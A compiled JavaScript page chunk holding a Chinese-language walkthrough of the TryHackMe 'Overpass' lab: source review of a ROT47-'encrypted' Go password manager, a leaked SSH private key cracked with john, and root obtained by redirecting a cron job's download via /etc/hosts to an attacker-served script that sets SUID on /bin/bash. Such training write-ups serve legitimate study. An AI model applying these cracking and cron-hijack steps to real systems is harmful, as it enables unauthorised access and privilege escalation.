"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8790],{79187:(n,t,e)=>{e.r(t),e.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>i,metadata:()=>o,toc:()=>c});var s=e(74848),r=e(28453);const i={sidebar_position:11,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c","\u5bc6\u7801\u5b66","\u903b\u8f91\u6f0f\u6d1e","\u5b9a\u65f6\u4efb\u52a1"],title:"Overpass",sidebar_label:"Overpass"},a="Overpass",o={id:"box/TryHackMe/11",title:"Overpass",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/11.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/11",permalink:"/docs/box/TryHackMe/11",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"\u903b\u8f91\u6f0f\u6d1e",permalink:"/docs/tags/\u903b\u8f91\u6f0f\u6d1e"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:11,frontMatter:{sidebar_position:11,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u7834\u89e3-\u54c8\u5e0c","\u5bc6\u7801\u5b66","\u903b\u8f91\u6f0f\u6d1e","\u5b9a\u65f6\u4efb\u52a1"],title:"Overpass",sidebar_label:"Overpass"},sidebar:"boxSidebar",previous:{title:"Agent Sudo",permalink:"/docs/box/TryHackMe/10"},next:{title:"Startup",permalink:"/docs/box/TryHackMe/12"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"james",id:"james",level:3},{value:"james --&gt; root",id:"james----root",level:3}];function p(n){const t={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"overpass",children:"Overpass"}),"\n",(0,s.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528112934.png",alt:"20240528112934"})}),"\n",(0,s.jsx)(t.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528112946.png",alt:"20240528112946"})}),"\n",(0,s.jsx)(t.admonition,{type:"note",children:(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:"\u5b58\u50a8\u7684\u5bc6\u7801\u662f\u5b58\u50a8\u5728\u672c\u5730\u52a0\u5bc6\u7684"}),"\n",(0,s.jsx)(t.li,{children:"\u519b\u4e8b\u7ea7\u52a0\u5bc6 \uff08\u7f57\u9a6c\uff1f\uff09"}),"\n",(0,s.jsx)(t.li,{children:"\u7a0b\u5e8f\u7684\u6e90\u7801\uff0c \u4f7f\u7528 go \u8bed\u8a00\u7f16\u5199"}),"\n"]})}),"\n",(0,s.jsx)(t.p,{children:"\u6211\u4eec\u83b7\u53d6 go \u8bed\u8a00\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsxs)(t.li,{children:["\u5bc6\u7801\u5b58\u50a8\u5728\u672c\u5730 ",(0,s.jsx)(t.code,{children:".overpass"})," \u6587\u4ef6\u4e2d, \u6240\u4ee5\u5f53\u6211\u4eec\u5165\u4fb5\u6210\u529f\u540e\u5e94\u8be5\u53bb\u5bfb\u627e\u6b64\u6587\u4ef6\u501f\u6b64\u6765\u8fdb\u884c\u83b7\u53d6\u7528\u6237\u7684\u5bc6\u7801"]}),"\n",(0,s.jsx)(t.li,{children:"\u4f7f\u7528 rot47 \u52a0\u5bc6"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-go",children:'package main\n\nimport (\n\t"bufio"\n\t"encoding/json"\n\t"fmt"\n\t"io/ioutil"\n\t"os"\n\t"strconv"\n\t"strings"\n\n\t"github.com/mitchellh/go-homedir"\n)\n\ntype passListEntry struct {\n\tName string `json:"name"`\n\tPass string `json:"pass"`\n}\n\n//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example\nfunc rot47(input string) string {\n\tvar result []string\n\tfor i := range input[:len(input)] {\n\t\tj := int(input[i])\n\t\tif (j >= 33) && (j <= 126) {\n\t\t\tresult = append(result, string(rune(33+((j+14)%94))))\n\t\t} else {\n\t\t\tresult = append(result, string(input[i]))\n\t\t}\n\t}\n\treturn strings.Join(result, "")\n}\n\n//Encrypt the credentials and write them to a file.\nfunc saveCredsToFile(filepath string, passlist []passListEntry) string {\n\tfile, err := os.OpenFile(filepath, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn err.Error()\n\t}\n\tdefer file.Close()\n\tstringToWrite := rot47(credsToJSON(passlist))\n\tif _, err := file.WriteString(stringToWrite); err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn err.Error()\n\t}\n\treturn "Success"\n}\n\n//Load the credentials from the encrypted file\nfunc loadCredsFromFile(filepath string) ([]passListEntry, string) {\n\tbuff, err := ioutil.ReadFile(filepath)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn nil, "Failed to open or read file"\n\t}\n\t//Decrypt passwords\n\tbuff = []byte(rot47(string(buff)))\n\t//Load decrypted passwords\n\tvar passlist []passListEntry\n\terr = json.Unmarshal(buff, &passlist)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn nil, "Failed to load creds"\n\t}\n\treturn passlist, "Ok"\n}\n\n//Convert the array of credentials to JSON\nfunc credsToJSON(passlist []passListEntry) string {\n\tjsonBuffer, err := json.Marshal(passlist)\n\tif err != nil {\n\t\tfmt.Println(err.Error())\n\t\treturn "Something went wrong"\n\t}\n\treturn string(jsonBuffer)\n}\n\n//Python style input function\nfunc input(prompt string) string {\n\tfmt.Print(prompt)\n\tscanner := bufio.NewScanner(os.Stdin)\n\tif scanner.Scan() {\n\t\treturn scanner.Text()\n\n\t}\n\treturn ""\n}\n\nfunc serviceSearch(passlist []passListEntry, serviceName string) (int, passListEntry) {\n\t//A linear search is the best I can do, Steve says it\'s Oh Log N whatever that means\n\tfor index, entry := range passlist {\n\t\tif entry.Name == serviceName {\n\t\t\treturn index, entry\n\t\t}\n\t}\n\treturn -1, passListEntry{}\n}\n\n# \u6839\u636e\u670d\u52a1\u540d\u79f0\u627e\u56de\u5bf9\u5e94\u7684\u5bc6\u7801\nfunc getPwdForService(passlist []passListEntry, serviceName string) string {\n\tindex, entry := serviceSearch(passlist, serviceName)\n\tif index != -1 {\n\t\treturn entry.Pass\n\t}\n\treturn "Pass not found"\n}\n\n# \u8bbe\u7f6e\u4e00\u4e2a\u670d\u52a1\u7684\u5bc6\u7801\nfunc setPwdForService(passlist []passListEntry, serviceName string, newPwd string) []passListEntry {\n\tindex, entry := serviceSearch(passlist, serviceName)\n\t//If service exists, update entry\n\tif index != -1 {\n\t\tentry.Pass = newPwd\n\t\tpasslist[index] = entry\n\t\treturn passlist\n\t}\n\t//If it doesn\'t, create an entry\n\tentry = passListEntry{Name: serviceName, Pass: newPwd}\n\tpasslist = append(passlist, entry)\n\treturn passlist\n}\n\nfunc deletePwdByService(passlist []passListEntry, serviceName string) (resultList []passListEntry, status string) {\n\tindex, _ := serviceSearch(passlist, serviceName)\n\tif index != -1 {\n\t\t//remove Pwd from passlist\n\t\tresultList = append(passlist[:index], passlist[index+1:]...)\n\t\tstatus = "Ok"\n\t\treturn\n\t}\n\treturn passlist, "Pass not found"\n}\n\nfunc printAllPasswords(passlist []passListEntry) {\n\tfor _, entry := range passlist {\n\t\tfmt.Println(entry.Name, "\\t", entry.Pass)\n\t}\n}\n\nfunc main() {\n\tcredsPath, err := homedir.Expand("~/.overpass")\t\t# \u5bc6\u7801\u5b58\u50a8\u5728\u672c\u5730 ~/.overpass\n\tif err != nil {\n\t\tfmt.Println("Error finding home path:", err.Error())\n\t}\n\t//Load credentials\n\tpasslist, status := loadCredsFromFile(credsPath)\n\tif status != "Ok" {\n\t\tfmt.Println(status)\n\t\tfmt.Println("Continuing with new password file.")\n\t\tpasslist = make([]passListEntry, 0)\n\t}\n\n\tfmt.Println("Welcome to Overpass")\n\n\t//Determine function\n\toption := -1\n\tfmt.Print(\n\t\t"Options:\\n" +\n\t\t\t"1\\tRetrieve Password For Service\\n" +\n\t\t\t"2\\tSet or Update Password For Service\\n" +\n\t\t\t"3\\tDelete Password For Service\\n" +\n\t\t\t"4\\tRetrieve All Passwords\\n" +\n\t\t\t"5\\tExit\\n")\n\n\tfor option > 5 || option < 1 {\n\t\toptionString := input("Choose an option:\\t")\n\t\toptionChoice, err := strconv.Atoi(optionString)\n\t\tif err != nil || optionChoice > 5 || optionChoice < 1 {\n\t\t\tfmt.Println("Please enter a valid number")\n\t\t}\n\t\toption = optionChoice\n\t}\n\n\tswitch option {\n\tcase 1:\n\t\tservice := input("Enter Service Name:\\t")\n\t\tgetPwdForService(passlist, service)\n\tcase 2:\n\t\tservice := input("Enter Service Name:\\t")\n\t\tnewPwd := input("Enter new password:\\t")\n\t\tpasslist = setPwdForService(passlist, service, newPwd)\n\t\tsaveCredsToFile(credsPath, passlist)\n\tcase 3:\n\t\tservice := input("Enter Service Name:\\t")\n\t\tpasslist, status := deletePwdByService(passlist, service)\n\t\tif status != "Ok" {\n\t\t\tfmt.Println(status)\n\t\t}\n\t\tsaveCredsToFile(credsPath, passlist)\n\tcase 4:\n\t\tprintAllPasswords(passlist)\n\t}\n}\n'})}),"\n",(0,s.jsx)(t.p,{children:"\u6211\u4eec\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u53d1\u73b0\u4e00\u4e2a admin \u76ee\u5f55"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113049.png",alt:"20240528113049"})}),"\n",(0,s.jsx)(t.p,{children:"\u8bbf\u95ee admin \u53d1\u73b0\u5176\u5b9e\u662f\u4e00\u4e2a\u767b\u5f55\u7a97\u53e3\uff0c \u67e5\u770b\u6e90\u7801\u540e\u53ef\u4ee5\u53d1\u73b0\u5176\u767b\u5f55\u9a8c\u8bc1\u662f\u57fa\u4e8e\u524d\u7aef JS  \u6587\u4ef6\u7684"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113101.png",alt:"20240528113101"})}),"\n",(0,s.jsx)(t.p,{children:"\u767b\u5f55\u7ad9\u70b9\u540e\u53d1\u73b0\u5176\u5185\u5bb9\u662f james  \u7684 SSH  \u5bc6\u94a5"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-txt",children:"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337\n\nLNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN\nJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal\n73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT\nWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv\nBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ\nAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR\n3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf\nABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk\nVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR\nOkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P\n9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze\neaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ\n4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8\nGFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn\nexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy\nAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk\n6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58\ndPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i\nn0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT\n8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K\n4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z\nylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS\n49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2\n+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk\n2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7\n-----END RSA PRIVATE KEY-----\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u53d1\u73b0\u5176\u5b58\u5728\u5bc6\u7801\uff0c \u4f7f\u7528 john \u8fdb\u884c\u7834\u89e3"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-208-226:~# `locate ssh2john` id_rsa > hash.ttx\nroot@ip-10-10-208-226:~# john hash.ttx --wordlist=`locate rockyou.txt`\nNote: This format may emit false positives, so it will keep trying even after finding a\npossible candidate.\nWarning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"\nUse the "--format=ssh-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\njames13          (id_rsa)\n1g 0:00:00:11 DONE (2023-08-04 02:19) 0.08912g/s 1278Kp/s 1278Kc/s 1278KC/s *7\xa1Vamos!\nSession completed. \nroot@ip-10-10-208-226:~#\n'})}),"\n",(0,s.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(t.h3,{id:"james",children:"james"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"$ ssh -i id_rsa james@10.10.3.246                                           \nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri Aug  4 01:29:26 UTC 2023\n\n  System load:  0.08               Processes:           88\n  Usage of /:   22.3% of 18.57GB   Users logged in:     0\n  Memory usage: 29%                IP address for eth0: 10.10.3.246\n  Swap usage:   0%\n\n\n47 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Sat Jun 27 04:45:40 2020 from 192.168.170.1\njames@overpass-prod:~$ id\nuid=1001(james) gid=1001(james) groups=1001(james)\njames@overpass-prod:~$\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u7ed3\u5408\u524d\u9762\u7684\u5185\u5bb9\u6211\u4eec\u53d1\u73b0\u4e00\u4e2a\u52a0\u5bc6\u7684\u5bc6\u7801\u6587\u4ef6\uff0c \u5e76\u4e14\u6211\u4eec\u77e5\u9053\u52a0\u5bc6\u7684\u683c\u5f0f\u6211\u4eec\u5c06\u5176\u7834\u89e3"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"james@overpass-prod:~$ ls -al\ntotal 48\ndrwxr-xr-x 6 james james 4096 Jun 27  2020 .\ndrwxr-xr-x 4 root  root  4096 Jun 27  2020 ..\nlrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null\n-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout\n-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc\ndrwx------ 2 james james 4096 Jun 27  2020 .cache\ndrwx------ 3 james james 4096 Jun 27  2020 .gnupg\ndrwxrwxr-x 3 james james 4096 Jun 27  2020 .local\n-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass\n-rw-r--r-- 1 james james  807 Jun 27  2020 .profile\ndrwx------ 2 james james 4096 Jun 27  2020 .ssh\n-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt\n-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt\njames@overpass-prod:~$ cat .overpass \n,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.j\n"})}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:(0,s.jsx)(t.a,{href:"https://gchq.github.io/CyberChef/#recipe=ROT47(47)&input=LExRPzI+NlFpUSRKREU2PlFbUUEyRERRaVFEMko1QzJIPz1KOj84QTo0RUZDNlFOLg",children:"CyberChef"})}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:"\u89e3\u5bc6\u540e\u5224\u65ad\u4e3a\u5176\u4e2a\u4eba\u5bc6\u7801"}),"\n",(0,s.jsx)(t.h3,{id:"james----root",children:"james --\x3e root"}),"\n",(0,s.jsx)(t.p,{children:"\u5728\u7528\u6237\u5bb6\u76ee\u5f55\u53d1\u73b0\u4e00\u4e2a todo.txt \u6211\u4eec\u53d1\u73b0\u5176\u4e2d\u63d0\u5230\u4e86\u4e00\u4e2a\u81ea\u52a8\u5316\u6784\u5efa\u811a\u672c\u6240\u4ee5\u6211\u4eec\u5c1d\u8bd5\u67e5\u627e"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113400.png",alt:"20240528113400"})}),"\n",(0,s.jsx)(t.p,{children:"\u5728\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u4e2a\u81ea\u52a8\u5316\u7684\u6267\u884c\u4efb\u52a1"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113414.png",alt:"20240528113414"})}),"\n",(0,s.jsx)(t.p,{children:"\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5176\u662f\u6307\u5b9a\u7684\u57df\u540d\uff0c \u5982\u679c\u6211\u4eec\u4fee\u6539 host \u6587\u4ef6\u5c31\u53ef\u4ee5\u5b8c\u6210\u6211\u4eec\u7684\u653b\u51fb, \u6211\u4eec\u5c06\u5176\u6307\u5b9a\u4e3a\u6211\u4eec\u7684 VPN \u7684 IP \u5728\u672c\u5730\u521b\u5efa\u5bf9\u5e94\u7684\u6076\u610f bash \u6587\u4ef6\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u7b49\u5f85\u8fde\u63a5\u5373\u53ef"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"james@overpass-prod:~$ cat /etc/hosts\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n**10.13.31.216** overpass.thm\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u5728\u672c\u5730\u521b\u5efa\u5bf9\u5e94\u7684\u76ee\u5f55"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"$ tree downloads                                                      \ndownloads\n\u2514\u2500\u2500 src\n    \u2514\u2500\u2500 buildscript.sh\n\n$ cat downloads/src/buildscript.sh                                          \n#!/bin/bash\nchmod u+s /bin/bash\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u5728\u672c\u5730\u5f00\u542f HTTP \u670d\u52a1\u7b49\u5f85\u8fde\u63a5\u5373\u53ef"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113429.png",alt:"20240528113429"})}),"\n",(0,s.jsx)(t.p,{children:"\u7b49\u5f85\u8fde\u63a5\u5373\u53ef"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240528113436.png",alt:"20240528113436"})}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"james@overpass-prod:~$ /bin/bash -p\nbash-4.4# id\nuid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)\n"})})]})}function d(n={}){const{wrapper:t}={...(0,r.R)(),...n.components};return t?(0,s.jsx)(t,{...n,children:(0,s.jsx)(p,{...n})}):p(n)}},28453:(n,t,e)=>{e.d(t,{R:()=>a,x:()=>o});var s=e(96540);const r={},i=s.createContext(r);function a(n){const t=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(t):{...t,...n}}),[t,n])}function o(n){let t;return t=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:a(n.components),s.createElement(i.Provider,{value:t},n.children)}}}]);